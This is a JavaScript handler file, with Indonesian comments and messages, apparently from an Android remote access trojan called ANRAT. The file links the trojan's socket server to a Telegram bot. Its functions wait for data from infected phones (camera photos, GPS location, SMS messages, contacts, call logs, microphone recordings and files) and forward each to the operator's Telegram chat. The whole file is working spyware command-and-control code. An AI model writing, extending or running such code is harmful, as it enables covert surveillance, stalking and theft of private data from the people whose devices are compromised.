// File baru: handlers/resultListener.js
const main = require('../index');
const io = require('socket.io-client');

let socketConnection = null;

// Connect to ANRAT Server Socket
function connectToServer() {
    if (socketConnection) return socketConnection;

    const serverUrl = process.env.ANRAT_SERVER_URL || 'http://localhost:42474';
    
    socketConnection = io(serverUrl, {
        transports: ['websocket'],
        reconnection: true
    });

    socketConnection.on('connect', () => {
        console.log('✅ Bot connected to ANRAT Server Socket');
    });

    socketConnection.on('disconnect', () => {
        console.log('⚠️ Bot disconnected from ANRAT Server');
    });

    return socketConnection;
}

// Listen for camera results
function listenForCameraResult(deviceId, chatId) {
    const socket = connectToServer();
    
    const eventName = `x0000ca_${deviceId}`;
    
    socket.once(eventName, (data) => {
        if (data.image) {
            console.log('📷 Camera image received for device:', deviceId);
            
            // Convert buffer to base64
            const uint8Arr = new Uint8Array(data.buffer);
            let binary = '';
            for (let i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            const base64String = Buffer.from(binary, 'binary').toString('base64');
            const imageBuffer = Buffer.from(base64String, 'base64');
            
            // Send to telegram
            main.bot.sendPhoto(chatId, imageBuffer, {
                caption: `📷 Foto dari Device: ${deviceId}`
            }).catch(err => {
                console.error('Error sending photo:', err);
                main.bot.sendMessage(chatId, '❌ Gagal mengirim foto');
            });
        }
    });

    console.log(`👂 Listening for camera result from device: ${deviceId}`);
}

// Listen for location results
function listenForLocationResult(deviceId, chatId) {
    const socket = connectToServer();
    
    const eventName = `x0000lm_${deviceId}`;
    
    socket.once(eventName, (data) => {
        if (data.lat && data.lng) {
            console.log('📍 Location received for device:', deviceId);
            
            const message = `📍 <b>Lokasi Device</b>\n\n` +
                          `<b>Device ID:</b> <code>${deviceId}</code>\n` +
                          `<b>Latitude:</b> ${data.lat}\n` +
                          `<b>Longitude:</b> ${data.lng}\n\n` +
                          `🗺️ <a href="https://www.google.com/maps?q=${data.lat},${data.lng}">Lihat di Google Maps</a>`;
            
            main.bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
            
            // Send location as map
            main.bot.sendLocation(chatId, data.lat, data.lng);
        } else {
            main.bot.sendMessage(chatId, '❌ Lokasi tidak tersedia atau GPS tidak aktif');
        }
    });

    console.log(`👂 Listening for location result from device: ${deviceId}`);
}

// Listen for SMS results
function listenForSmsResult(deviceId, chatId) {
    const socket = connectToServer();
    
    const eventName = `x0000sm_${deviceId}`;
    
    socket.once(eventName, (data) => {
        if (data.smsList) {
            console.log('📥 SMS list received for device:', deviceId);
            
            const smsList = data.smsList;
            let message = `📥 <b>SMS List (${smsList.length} pesan)</b>\n\n`;
            
            // Show first 10 SMS
            const displayList = smsList.slice(0, 10);
            displayList.forEach((sms, index) => {
                message += `${index + 1}. <b>${sms.phoneNo}</b>\n`;
                message += `   ${sms.msg.substring(0, 50)}${sms.msg.length > 50 ? '...' : ''}\n\n`;
            });
            
            if (smsList.length > 10) {
                message += `\n... dan ${smsList.length - 10} SMS lainnya`;
            }
            
            main.bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        }
    });

    console.log(`👂 Listening for SMS result from device: ${deviceId}`);
}

// Listen for contacts results
function listenForContactsResult(deviceId, chatId) {
    const socket = connectToServer();
    
    const eventName = `x0000cn_${deviceId}`;
    
    socket.once(eventName, (data) => {
        if (data.contactsList) {
            console.log('📇 Contacts received for device:', deviceId);
            
            const contacts = data.contactsList;
            let message = `📇 <b>Daftar Kontak (${contacts.length} kontak)</b>\n\n`;
            
            // Show first 15 contacts
            const displayList = contacts.slice(0, 15);
            displayList.forEach((contact, index) => {
                message += `${index + 1}. <b>${contact.name || 'No Name'}</b>\n`;
                message += `   📱 ${contact.phoneNo}\n\n`;
            });
            
            if (contacts.length > 15) {
                message += `\n... dan ${contacts.length - 15} kontak lainnya`;
            }
            
            main.bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        }
    });

    console.log(`👂 Listening for contacts result from device: ${deviceId}`);
}

// Listen for call logs results
function listenForCallsResult(deviceId, chatId) {
    const socket = connectToServer();
    
    const eventName = `x0000cl_${deviceId}`;
    
    socket.once(eventName, (data) => {
        if (data.callsList) {
            console.log('📞 Call logs received for device:', deviceId);
            
            const calls = data.callsList;
            let message = `📞 <b>Riwayat Panggilan (${calls.length} log)</b>\n\n`;
            
            // Show first 10 calls
            const displayList = calls.slice(0, 10);
            displayList.forEach((call, index) => {
                const type = call.type == 1 ? '📥 Masuk' : '📤 Keluar';
                const name = call.name || 'Unknown';
                message += `${index + 1}. ${type} - <b>${name}</b>\n`;
                message += `   📱 ${call.phoneNo}\n`;
                message += `   ⏱️ ${call.duration}s\n\n`;
            });
            
            if (calls.length > 10) {
                message += `\n... dan ${calls.length - 10} log lainnya`;
            }
            
            main.bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        }
    });

    console.log(`👂 Listening for calls result from device: ${deviceId}`);
}

// Listen for mic/audio results
function listenForMicResult(deviceId, chatId) {
    const socket = connectToServer();
    
    const eventName = `x0000mc_${deviceId}`;
    
    socket.once(eventName, (data) => {
        if (data.file && data.buffer) {
            console.log('🎤 Audio received for device:', deviceId);
            
            const audioBuffer = Buffer.from(data.buffer);
            
            main.bot.sendAudio(chatId, audioBuffer, {
                caption: `🎤 Rekaman Audio dari Device: ${deviceId}`,
                filename: data.name || 'recording.mp3'
            }).catch(err => {
                console.error('Error sending audio:', err);
                main.bot.sendMessage(chatId, '❌ Gagal mengirim audio');
            });
        }
    });

    console.log(`👂 Listening for audio result from device: ${deviceId}`);
}

// Listen for file manager results
function listenForFilesResult(deviceId, chatId) {
    const socket = connectToServer();
    
    const eventName = `x0000fm_${deviceId}`;
    
    socket.once(eventName, (data) => {
        if (data.file && data.buffer) {
            // File download result
            console.log('📂 File received for device:', deviceId);
            
            const fileBuffer = Buffer.from(data.buffer);
            
            main.bot.sendDocument(chatId, fileBuffer, {
                caption: `📂 File: ${data.name}`,
                filename: data.name
            }).catch(err => {
                console.error('Error sending file:', err);
                main.bot.sendMessage(chatId, '❌ Gagal mengirim file');
            });
        } else if (Array.isArray(data)) {
            // File list result
            console.log('📂 File list received for device:', deviceId);
            
            let message = `📂 <b>Daftar File (${data.length} item)</b>\n\n`;
            
            data.slice(0, 20).forEach((file, index) => {
                const icon = file.isDirectory ? '📁' : '📄';
                message += `${index + 1}. ${icon} ${file.name}\n`;
            });
            
            if (data.length > 20) {
                message += `\n... dan ${data.length - 20} item lainnya`;
            }
            
            main.bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
        }
    });

    console.log(`👂 Listening for files result from device: ${deviceId}`);
}

module.exports = {
    connectToServer,
    listenForCameraResult,
    listenForLocationResult,
    listenForSmsResult,
    listenForContactsResult,
    listenForCallsResult,
    listenForMicResult,
    listenForFilesResult
};